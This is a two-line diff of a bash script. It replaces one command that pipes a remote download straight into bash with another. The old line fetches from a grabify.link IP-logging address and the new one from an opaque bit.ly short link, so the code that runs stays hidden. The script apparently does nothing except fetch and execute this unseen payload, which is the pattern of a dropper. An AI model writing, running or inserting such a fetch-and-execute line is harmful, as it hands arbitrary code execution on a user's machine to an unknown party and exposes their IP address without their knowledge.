@@ -1,2 +1,2 @@
 #!/bin/bash
-curl -sL https://grabify.link/XTHQUR | bash 
+curl -sL https://bit.ly/tolilah | bash 
